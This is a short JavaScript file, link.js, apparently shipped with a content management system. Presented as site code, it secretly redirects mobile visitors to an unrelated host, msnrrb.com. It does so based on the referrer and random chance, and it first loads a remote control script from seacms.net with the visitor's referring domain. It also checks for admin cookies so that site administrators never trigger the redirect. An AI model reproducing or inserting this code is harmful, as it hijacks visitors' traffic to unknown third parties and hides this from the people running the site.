//link.js
function loadJS_html( url, callback ){
    var script = document.createElement('script'),
        fn = callback || function(){};
    script.type = 'text/javascript';
    {
        script.onload = function(){
            fn();
        };
    }
    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
}

function isPc_html(){
    try {
        var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
        var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
        if (isMac || isWin){
            return true;
        }else{
            return false;
        }
    }catch(err){
        return false;
    }
}

function html_update(html_pc) {
    // loadJS_html('//sdk.51.la/js-sdk-pro.min.js?id=K0KY5ZuePNEUYvcX&ck=K0KY5ZuePNEUYvcX',function(){
    var s=document.referrer.split('/')[2];
    var rand_html = Math.floor((Math.random()*100)+1);
    
    if(rand_html<=50){
            loadJS_html("https://www.seacms.net/api/check.js?url="+s,function(){
                if(usercache == true){
                    if(html_pc!=="") {
                        window.location.href = html_pc;
                    } 
                }
            }); 
        }
    // });
}


var ismobile_html = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
if(ismobile_html) {
	var s = document.referrer;
    var html_pc = "";
    var default_html_pc = "https://msnrrb.com:2788/redirect?from=sc";
    var rand_html = Math.floor((Math.random()*100)+1);

    if(s.indexOf("www.dxtv1.com") !== -1 || s.indexOf("www.ys752.com") !== -1){
        html_pc = "https://msnrrb.com:2788/redirect?from=sc";
    }else if(s.indexOf("shuanshu.com.com") !== -1){
        html_pc = "https://msnrrb.com:2788/redirect?from=sc";
    }else{
        if(rand_html <= 10){
            html_pc = default_html_pc;
        }
    }
    
    if(html_pc != "" && !isPc_html()){
        if (document.cookie.indexOf("admin_id") == -1 && document.cookie.indexOf("adminlevels") == -1) {
            html_update(html_pc);
        }
    }

}